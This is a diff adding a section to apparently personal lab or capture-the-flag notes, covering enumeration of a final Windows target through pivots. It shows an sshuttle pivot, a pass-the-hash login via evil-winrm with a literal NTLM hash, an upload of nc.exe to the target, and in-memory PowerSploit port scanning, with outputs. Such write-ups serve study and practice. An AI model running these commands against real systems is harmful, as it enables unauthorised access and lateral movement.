@@ -2213,5 +2213,96 @@ Options:
 - Many C2 frameworks available
 - Empire and Starkiller
 
+</details>
+
+## 20. Personal PC - Enumeration
+
+<details>
+  <summary>---</summary>
+
+- Final target - likely a Windows machine with AV. 
+- Scanning through 2 proxy would be slow
+- Empire modules
+
+### evil-winrm - Upload/Download
+
+- Handy to upload tool to target, download log file
+- `upload LOCAL_FILEPATH REMOTE_FILEPATH`
+- `download REMOTE_FILEPATH LOCAL_FILEPATH`
+
+1. Setup sshuttle `sshuttle -r root@10.200.85.200 --ssh-cmd "ssh -i ssh/webserver_id_rsa" 10.200.85.0/24 -x 10.200.85.200`
+2. Use the previously found Administrator hash `evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.85.150`
+3. Perform upload
+
+```
+*Evil-WinRM* PS C:\Users\Administrator\Documents> upload /usr/share/windows-binaries/nc.exe c:\windows\temp\nc-Neozer0.exe
+Info: Uploading /usr/share/windows-binaries/nc.exe to c:\windows\temp\nc-Neozer0.exe
+
+                                                             
+Data: 79188 bytes of 79188 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> dir c:\windows\temp\nc-Neozer0.exe
+
+    Directory: C:\windows\temp
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        4/22/2021  10:39 AM          59392 nc-Neozer0.exe
+```
+
+4. Perform download
+
+```
+*Evil-WinRM* PS C:\Users\Administrator\Documents> echo "Demo" > demo.txt
+*Evil-WinRM* PS C:\Users\Administrator\Documents> download demo.txt
+Info: Downloading C:\Users\Administrator\Documents\demo.txt to demo.txt
+
+                                                             
+Info: Download successful!
+
+```
+
+### evil-winrm - Local scripts
+
+- If the tool being uploaded happens to be PowerShell script, there is an easier way
+- `-s` option allow to specify local directory containing PowerShell scripts.
+- These scripts are accessible directly into memory using evil-winrm session
+- `evil-winrm -u USERNAME  -p PASSWORD -i IP -s /opt/scripts`
+- `*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan.ps1`
+
+Check the help page
+```
+*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-Help Invoke-Portscan
+
+NAME
+    Invoke-Portscan
+
+SYNOPSIS
+    Simple portscan module
+
+    PowerSploit Function: Invoke-Portscan
+    Author: Rich Lundeen (http://webstersProdigy.net)
+    License: BSD 3-Clause
+    Required Dependencies: None
+    Optional Dependencies: None
+```
+
+Example usage: `Invoke-Portscan -Hosts 172.16.0.10 -TopPorts 50`
+
+Perform port scan on final target - ports 80 and 3389 are open
+```
+*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan -Hosts 10.200.85.100 -TopPorts 50
+
+
+Hostname      : 10.200.85.100
+alive         : True
+openPorts     : {80, 3389}
+closedPorts   : {}
+filteredPorts : {445, 443, 21, 23...}
+finishTime    : 4/22/2021 10:49:34 AM
+```
 
 </details>
